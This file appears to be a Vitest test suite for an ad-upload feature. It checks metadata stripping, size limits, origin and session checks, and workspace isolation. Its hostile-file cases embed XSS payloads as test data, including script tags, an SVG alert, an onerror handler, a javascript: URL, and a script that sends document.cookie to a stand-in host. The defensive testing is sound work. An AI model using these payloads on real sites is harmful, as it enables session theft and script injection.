// C8-3 Check an uploaded ad, the upload and its storage: test case 4 (hostile
// files refused with a plain reason, nothing stored), case 5 (another
// workspace can't see an upload or its check), and what is kept: a PNG or
// JPEG re-encoded without its metadata, as an asset of kind 'upload' made by
// a person, never simulated, in no campaign, and never usable as an ad's
// picture or a logo. The checks themselves are tests/agents/read-ad.test.ts.
import { randomUUID } from "node:crypto";
import sharp from "sharp";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { assetResponse } from "@/lib/assets/serve";
import type { Member } from "@/lib/agents/runs";
import { closeSql, getSql } from "@/lib/db/client";
import { asUser } from "@/lib/db/scoped";
import { carriesScript, readAdUpload, UPLOAD_MAX_BYTES, UPLOAD_MAX_SIDE, UploadError } from "@/lib/uploads/file";
import { checkAgain, getUpload, listUploads, uploadAd } from "@/lib/uploads/repo";
import { BODY_LIMIT, uploadResponse } from "@/lib/uploads/upload-response";
import { fixtureAd, withTextChunk } from "../fixtures/uploaded-ads";
import { startWhileAnotherStarts } from "../helpers/run-lock";
import { createMember, truncateAll } from "../helpers/db";

let a: Member;
let b: Member;
let brand: string;
const sent: { name: string; data: Record<string, unknown> }[] = [];
const send = async (e: { name: string; data: Record<string, unknown> }) => {
  sent.push(e);
};

const OPTS = { channel: "paid social", lang: "en-GB" };
const counts = async (m: Member = a) =>
  (
    await asUser(m.userId, (tx) => tx`
      select (select count(*)::int from public.assets where kind = 'upload') as uploads,
             (select count(*)::int from public.agent_runs where agent = 'readAd') as runs`)
  )[0] as { uploads: number; runs: number };

/** A noisy PNG (it doesn't compress), of about the given size in bytes. */
async function noisyPng(width: number, height: number): Promise<Buffer> {
  const raw = Buffer.alloc(width * height * 3);
  for (let i = 0; i < raw.length; i++) raw[i] = (i * 2654435761) >>> 24;
  return sharp(raw, { raw: { width, height, channels: 3 } }).png({ compressionLevel: 0 }).toBuffer();
}

/** A request to the upload route as the Check an ad page sends it. */
function uploadRequest(form: FormData, headers: Record<string, string> = {}): Request {
  return new Request(`http://studio.test/brands/${brand}/check/upload`, { method: "POST", body: form, headers: { origin: "http://studio.test", host: "studio.test", ...headers } });
}
const formWith = async (bytes: Buffer, name = "ad.png", type = "image/png") => {
  const form = new FormData();
  form.set("ad", new File([new Uint8Array(bytes)], name, { type }));
  form.set("channel", "paid social");
  form.set("lang", "en-GB");
  return form;
};

beforeAll(async () => {
  await truncateAll();
  a = await createMember();
  b = await createMember();
  const [r] = await asUser(a.userId, (tx) => tx`
    insert into public.brands (workspace_id, name, slug, created_by, palette, font_primary, font_secondary, legal_lines, banned_terms, dont_rules, category)
    values (${a.workspaceId}, 'Fernhollow Outfitters', 'fernhollow', ${a.userId},
            ${tx.json([{ name: "Moss", hex: "#3F5B3A" }, { name: "Fog", hex: "#E8EBE4" }, { name: "Peat", hex: "#2B2A26" }])},
            'Georgia', 'Helvetica', ${["Prices include VAT.", "Free returns within 30 days on unworn items."]}, ${["indestructible"]},
            ${["Use fear (storms, danger) to sell"]}, 'Outdoor apparel')
    returning id`);
  brand = r.id;
});
afterAll(closeSql);

describe("C8-3 uploads", () => {
  it("a PNG or JPEG is stored as an upload: re-encoded without its metadata, by a person, not simulated, in no campaign", async () => {
    const png = await sharp(await fixtureAd())
      .withExif({ IFD0: { Artist: "Agency Person", ImageDescription: "taken at the office" } })
      .png()
      .toBuffer();
    expect(png.includes(Buffer.from("Agency Person"))).toBe(true);
    const before = sent.length;
    const r = await uploadAd(a, brand, { name: "agency ad <final>.png", type: "image/png", bytes: png }, OPTS, send);
    expect(r.runId).toMatch(/^[0-9a-f-]{36}$/);
    expect(sent.length).toBe(before + 1);
    const [row] = await asUser(a.userId, (tx) => tx`
      select kind, mime, width, height, bytes, brand_id, campaign_id, run_id, created_by_kind, simulated, meta from public.assets where id = ${r.assetId}`);
    expect(row).toMatchObject({ kind: "upload", mime: "image/png", width: 1080, height: 1080, brand_id: brand, campaign_id: null, run_id: null, created_by_kind: "person", simulated: false });
    expect((row.meta as { name: string }).name).toBe("agency ad final.png");
    const stored = row.bytes as Buffer;
    expect((await sharp(stored).metadata()).exif).toBeUndefined();
    expect(stored.includes(Buffer.from("Agency Person"))).toBe(false);
    // The run is a Read ad run for this upload, its channel and language.
    const [run] = await asUser(a.userId, (tx) => tx`select agent, brand_id, input, label from public.agent_runs where id = ${r.runId}`);
    expect(run).toMatchObject({ agent: "readAd", brand_id: brand, input: { brandId: brand, assetId: r.assetId, channel: "paid social", lang: "en-GB" }, label: "Fernhollow Outfitters: check an uploaded ad" });

    // A JPEG stays a JPEG, turned upright, without its EXIF.
    const jpeg = await sharp(await fixtureAd({ format: "jpeg", size: { width: 800, height: 600 } }))
      .withMetadata({ orientation: 6 })
      .jpeg()
      .toBuffer();
    const j = await uploadAd(a, brand, { name: "ad.jpg", bytes: jpeg }, { channel: "display", lang: "en-GB" }, send);
    const [jr] = await asUser(a.userId, (tx) => tx`select mime, width, height, bytes from public.assets where id = ${j.assetId}`);
    expect(jr).toMatchObject({ mime: "image/jpeg", width: 600, height: 800 });
    expect((await sharp(jr.bytes as Buffer).metadata()).exif).toBeUndefined();

    // Listed for the brand, newest first, with the run that is checking it.
    const list = await listUploads(a.userId, brand);
    expect(list.map((u) => u.id)).toEqual([j.assetId, r.assetId]);
    expect(list[1]).toMatchObject({ name: "agency ad final.png", src: `/assets/${r.assetId}`, check: null, run: { status: "queued", channel: "paid social" } });
    // A second check while one is queued is refused.
    await expect(checkAgain(a, brand, r.assetId, OPTS, send)).rejects.toThrow("This ad is being checked already.");
    // Review fix 4: a Check again while another click's start is part-way through waits for it, then is refused: one paid check.
    // (The JPEG's first check is marked finished first, so only the other click's run counts.)
    await getSql()`update public.agent_runs set status = 'failed', completed_at = now() where agent = 'readAd' and input ->> 'assetId' = ${j.assetId}`;
    const race = await startWhileAnotherStarts(`readAd:${j.assetId}`, { ...a, agent: "readAd", input: { assetId: j.assetId } }, () => checkAgain(a, brand, j.assetId, OPTS, send));
    expect(race.waited).toBe(true);
    expect(race.result).toMatchObject({ status: "rejected", reason: expect.objectContaining({ message: "This ad is being checked already. Wait for that check to finish." }) });
    const [{ n: queued }] = await getSql()`select count(*)::int as n from public.agent_runs where agent = 'readAd' and status = 'queued' and input ->> 'assetId' = ${j.assetId}`;
    expect(queued).toBe(1);
  }, 120_000);

  describe("#4 hostile files are refused with a plain reason, and nothing is stored", () => {
    const cases: [string, () => Promise<{ name: string; type?: string; bytes: Buffer }>, RegExp][] = [
      ["a non-image (a PDF)", async () => ({ name: "ad.pdf", type: "application/pdf", bytes: Buffer.from("%PDF-1.7\n1 0 obj << >> endobj\n") }), /^This file isn't a PNG or JPEG picture, so it can't be checked\.$/],
      ["a script named .png", async () => ({ name: "ad.png", type: "image/png", bytes: Buffer.from("<script>fetch('/api')</script>") }), /isn't a PNG or JPEG picture/],
      [
        "an SVG",
        async () => ({ name: "ad.svg", type: "image/svg+xml", bytes: Buffer.from('<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><rect width="10" height="10"/></svg>') }),
        /^An SVG can't be checked\. Upload the ad as a PNG or JPEG\.$/,
      ],
      ["an SVG named .png", async () => ({ name: "ad.png", type: "image/png", bytes: Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>') }), /An SVG can't be checked/],
      [
        "a file over 4 MB",
        async () => {
          const big = await noisyPng(1400, 1400);
          expect(big.length).toBeGreaterThan(UPLOAD_MAX_BYTES);
          return { name: "big.png", type: "image/png", bytes: big };
        },
        /^The file is too large \(4 MB at most\)\.$/,
      ],
      [
        "an oversized image (5000 px)",
        async () => ({ name: "wide.png", bytes: await sharp({ create: { width: 5000, height: 400, channels: 3, background: "#E8EBE4" } }).png().toBuffer() }),
        /^The picture is too big: 4096 pixels at most on each side \(this one is 5000 × 400\)\.$/,
      ],
      [
        "a PNG with a script in its metadata",
        async () => ({ name: "ad.png", bytes: withTextChunk(await fixtureAd(), "Comment", '<script>document.location="https://example.test/?c="+document.cookie</script>') }),
        /^This picture can't be checked: its metadata carries a script or web code\./,
      ],
      [
        "a PNG with a script in a compressed text chunk",
        async () => {
          const png = await fixtureAd({ size: { width: 300, height: 300 } });
          const { deflateSync } = await import("node:zlib");
          const data = Buffer.concat([Buffer.from("Comment\0\0", "latin1"), deflateSync(Buffer.from("<img src=x onerror=alert(1)>"))]);
          return { name: "ad.png", bytes: insertChunk(png, "zTXt", data) };
        },
        /its metadata carries a script/,
      ],
      ["a JPEG with a script in its EXIF", async () => ({ name: "ad.jpg", bytes: await sharp(await fixtureAd({ format: "jpeg", size: { width: 300, height: 300 } })).withExif({ IFD0: { ImageDescription: "javascript:alert(1)" } }).jpeg().toBuffer() }), /its metadata carries a script/],
      ["a PNG with a script after its end", async () => ({ name: "ad.png", bytes: Buffer.concat([await fixtureAd({ size: { width: 300, height: 300 } }), Buffer.from("<script>alert(1)</script>")]) }), /its metadata carries a script/],
      ["a PNG header with nothing behind it", async () => ({ name: "ad.png", bytes: Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(40)]) }), /^This picture couldn't be read\./],
      ["an empty file", async () => ({ name: "ad.png", bytes: Buffer.alloc(0) }), /^The file is empty\.$/],
    ];
    for (const [label, file, reason] of cases) {
      it(label, async () => {
        const before = await counts();
        const err = await uploadAd(a, brand, await file(), OPTS, send).catch((e) => e);
        expect(err).toBeInstanceOf(UploadError);
        expect((err as Error).message).toMatch(reason);
        expect(await counts()).toEqual(before);
      }, 60_000);
    }

    it("the limits are 4 MB and 4096 px a side, and a picture exactly at the side limit is kept", async () => {
      // Rory: 4 MB, so the file and its framing stay under the 4.5 MB production's host takes in a request (decision 0025).
      expect(UPLOAD_MAX_BYTES).toBe(4_194_304);
      expect(BODY_LIMIT).toBe(4_194_304 + 65_536);
      expect(BODY_LIMIT).toBeLessThan(4_500_000);
      expect(UPLOAD_MAX_SIDE).toBe(4096);
      const edge = await sharp({ create: { width: 4096, height: 200, channels: 3, background: "#E8EBE4" } }).png().toBuffer();
      expect((await readAdUpload({ name: "edge.png", bytes: edge })).width).toBe(4096);
      // Harmless metadata (an editor's name) is no reason to refuse; it is dropped by the re-encode.
      const harmless = withTextChunk(await fixtureAd({ size: { width: 300, height: 300 } }), "Software", "A drawing program 4.2");
      expect(carriesScript(harmless)).toBe(false);
      const kept = await readAdUpload({ name: "ad.png", bytes: harmless });
      expect(kept.bytes.includes(Buffer.from("A drawing program"))).toBe(false);
    });

    it("a channel or language the brand doesn't have is refused before anything is read or stored", async () => {
      const before = await counts();
      const png = await fixtureAd({ size: { width: 300, height: 300 } });
      await expect(uploadAd(a, brand, { name: "ad.png", bytes: png }, { channel: "search", lang: "en-GB" }, send)).rejects.toThrow("Choose the channel the ad is for");
      await expect(uploadAd(a, brand, { name: "ad.png", bytes: png }, { channel: "display", lang: "de-DE" }, send)).rejects.toThrow("Choose one of the brand's languages");
      expect(await counts()).toEqual(before);
    });
  });

  it("#4 the upload route refuses a body over the limit, another site's request and no session, storing nothing", async () => {
    const before = await counts();
    const read = async (r: Response) => ({ status: r.status, body: (await r.json()) as { ok: boolean; error?: string; href?: string } });
    const png = await fixtureAd({ size: { width: 300, height: 300 } });

    // Over the limit by the declared length, and by what is actually sent.
    const tooBig = await read(await uploadResponse(a.userId, brand, uploadRequest(await formWith(Buffer.alloc(BODY_LIMIT + 10, 1))), send));
    expect(tooBig).toEqual({ status: 413, body: { ok: false, error: "The file is too large (4 MB at most). Nothing was stored." } });
    const chunks = new ReadableStream({
      start(c) {
        for (let i = 0; i < 6; i++) c.enqueue(new Uint8Array(1024 * 1024));
        c.close();
      },
    });
    const streamed = new Request(`http://studio.test/brands/${brand}/check/upload`, {
      method: "POST",
      body: chunks,
      headers: { origin: "http://studio.test", host: "studio.test", "content-type": "multipart/form-data; boundary=x" },
      duplex: "half",
    } as RequestInit);
    expect((await read(await uploadResponse(a.userId, brand, streamed, send))).status).toBe(413);

    // Another site's page, no Origin at all, and no session.
    expect((await read(await uploadResponse(a.userId, brand, uploadRequest(await formWith(png), { origin: "https://elsewhere.example.test" }), send))).status).toBe(403);
    const noOrigin = new Request(`http://studio.test/brands/${brand}/check/upload`, { method: "POST", body: await formWith(png) });
    expect((await read(await uploadResponse(a.userId, brand, noOrigin, send))).status).toBe(403);
    expect(await read(await uploadResponse(null, brand, uploadRequest(await formWith(png)), send))).toEqual({ status: 401, body: { ok: false, error: "Sign in again to upload an ad. Nothing was stored." } });

    // A refused file through the route says why, plainly.
    const svg = await read(await uploadResponse(a.userId, brand, uploadRequest(await formWith(Buffer.from("<svg xmlns='http://www.w3.org/2000/svg'/>"), "ad.svg", "image/svg+xml")), send));
    expect(svg).toEqual({ status: 422, body: { ok: false, error: "An SVG can't be checked. Upload the ad as a PNG or JPEG. Nothing was stored." } });
    // Another workspace's brand is the same answer as no brand.
    const theirs = await read(await uploadResponse(b.userId, brand, uploadRequest(await formWith(png)), send));
    const none = await read(await uploadResponse(b.userId, randomUUID(), uploadRequest(await formWith(png)), send));
    expect(theirs).toEqual({ status: 404, body: { ok: false, error: "That brand isn't in your workspace." } });
    expect(none).toEqual(theirs);
    expect(await counts()).toEqual(before);
    expect(await counts(b)).toEqual({ uploads: 0, runs: 0 });

    // A good one goes through, and the answer says where to follow it.
    const good = await read(await uploadResponse(a.userId, brand, uploadRequest(await formWith(png)), send));
    expect(good.status).toBe(200);
    expect(good.body.href).toMatch(new RegExp(`^/brands/${brand}/check/[0-9a-f-]{36}$`));
    expect(await counts()).toEqual({ uploads: before.uploads + 1, runs: before.runs + 1 });
  }, 120_000);

  it("#5 another workspace can't see an upload or its check: not listed, the asset is a 404, and RLS in the database", async () => {
    const r = await uploadAd(a, brand, { name: "ad.png", bytes: await fixtureAd({ size: { width: 320, height: 320 } }) }, OPTS, send);
    // A check row, as the workflow saves it (tests/agents/read-ad.test.ts runs the real one).
    const [check] = await asUser(a.userId, (tx) => tx`
      insert into public.uploaded_ad_checks (workspace_id, brand_id, asset_id, channel, lang, run_id, words, findings, outcome, created_by)
      values (${a.workspaceId}, ${brand}, ${r.assetId}, 'paid social', 'en-GB', ${r.runId}, ${tx.json([{ text: "Walk the long way home", part: "headline" }])},
              ${tx.json([])}, 'review', ${a.userId})
      returning id`);
    expect((await getUpload(a.userId, brand, r.assetId))?.check?.id).toBe(check.id);

    expect(await listUploads(b.userId, brand)).toEqual([]);
    expect(await getUpload(b.userId, brand, r.assetId)).toBeNull();
    expect((await assetResponse(a.userId, r.assetId)).status).toBe(200);
    expect((await assetResponse(b.userId, r.assetId)).status).toBe(404);
    await expect(checkAgain(b, brand, r.assetId, OPTS, send)).rejects.toThrow("That brand isn't in your workspace.");
    // RLS: b reads nothing, and can't add a check to a's workspace or of a's upload.
    expect(await asUser(b.userId, (tx) => tx`select id from public.uploaded_ad_checks`)).toHaveLength(0);
    expect(await asUser(b.userId, (tx) => tx`select id from public.assets where id = ${r.assetId}`)).toHaveLength(0);
    await expect(
      asUser(b.userId, (tx) => tx`
        insert into public.uploaded_ad_checks (workspace_id, brand_id, asset_id, channel, lang, words, findings, outcome, created_by)
        values (${a.workspaceId}, ${brand}, ${r.assetId}, 'paid social', 'en-GB', '[]', '[]', 'passes', ${b.userId})`),
    ).rejects.toThrow(/row-level security|A check must be of an uploaded ad of the same brand/);
    await expect(
      asUser(b.userId, (tx) => tx`
        insert into public.uploaded_ad_checks (workspace_id, brand_id, asset_id, channel, lang, words, findings, outcome, created_by)
        values (${b.workspaceId}, ${brand}, ${r.assetId}, 'paid social', 'en-GB', '[]', '[]', 'passes', ${b.userId})`),
    ).rejects.toSatisfy(
      // QA fix: refused by the brand's foreign key (A's brand isn't in B's workspace) or the trigger, not by any error.
      (e: { code?: string; message?: string }) => e.code === "23503" || /A check must be of an uploaded ad of the same brand/.test(e.message ?? ""),
    );
    // Append-only: even its own workspace can't change or remove a check.
    await expect(asUser(a.userId, (tx) => tx`update public.uploaded_ad_checks set outcome = 'passes' where id = ${check.id}`)).rejects.toThrow(/permission denied/);
    await expect(asUser(a.userId, (tx) => tx`delete from public.uploaded_ad_checks where id = ${check.id}`)).rejects.toThrow(/permission denied/);
    // The anonymous role has nothing.
    const sql = getSql();
    await expect(sql.begin(async (tx) => {
      await tx`set local role anon`;
      return tx`select count(*) from public.uploaded_ad_checks`;
    })).rejects.toThrow(/permission denied/);
  }, 120_000);

  it("uploads are never used by Make creative or the pack: an ad's picture or a logo can't be an upload", async () => {
    const r = await uploadAd(a, brand, { name: "ad.png", bytes: await fixtureAd({ size: { width: 330, height: 330 } }) }, OPTS, send);
    const sql = getSql();
    await expect(sql`
      insert into public.ad_variants (workspace_id, campaign_id, brief_version, image_asset_id, copy_set_id, layout, checks, kit, origin, created_by)
      values (${a.workspaceId}, ${randomUUID()}, 1, ${r.assetId}, ${randomUUID()}, 'card', '{}', '{}', 'composed', ${a.userId})`).rejects.toThrow(/A variant's picture must be an image/);
    await expect(asUser(a.userId, (tx) => tx`update public.brands set logo_asset_id = ${r.assetId} where id = ${brand}`)).rejects.toThrow(/must be a PNG logo asset/);
    // The table keeps an upload a person's, not simulated, in no campaign, PNG or JPEG.
    const png = await fixtureAd({ size: { width: 20, height: 20 } });
    const insert = (kind: string, mime: string, extra: { simulated?: boolean; byKind?: string } = {}) =>
      asUser(a.userId, (tx) => tx`
        insert into public.assets (workspace_id, kind, brand_id, mime, width, height, bytes, sha256, simulated, created_by, created_by_kind)
        values (${a.workspaceId}, ${kind}, ${brand}, ${mime}, 20, 20, ${png}, ${"0".repeat(64)}, ${extra.simulated ?? false}, ${a.userId}, ${extra.byKind ?? "person"})`);
    await expect(insert("upload", "image/webp")).rejects.toThrow(/assets_kind_parts/);
    await expect(insert("upload", "image/png", { simulated: true })).rejects.toThrow(/assets_kind_parts/);
    await expect(insert("upload", "image/png", { byKind: "agent" })).rejects.toThrow(/assets_kind_parts/);
    await expect(insert("image", "image/jpeg")).rejects.toThrow(/assets_kind_parts/);
    await expect(insert("upload", "image/jpeg")).resolves.toBeDefined();
  });
});

function insertChunk(png: Buffer, type: string, data: Buffer): Buffer {
  const t = Buffer.from(type, "latin1");
  const len = Buffer.alloc(4);
  len.writeUInt32BE(data.length);
  let c = 0xffffffff;
  for (const byte of Buffer.concat([t, data])) {
    c ^= byte;
    for (let k = 0; k < 8; k++) c = c & 1 ? (c >>> 1) ^ 0xedb88320 : c >>> 1;
  }
  const crc = Buffer.alloc(4);
  crc.writeUInt32BE((c ^ 0xffffffff) >>> 0);
  const ihdrEnd = 8 + 4 + 4 + 13 + 4;
  return Buffer.concat([png.subarray(0, ihdrEnd), len, t, data, crc, png.subarray(ihdrEnd)]);
}
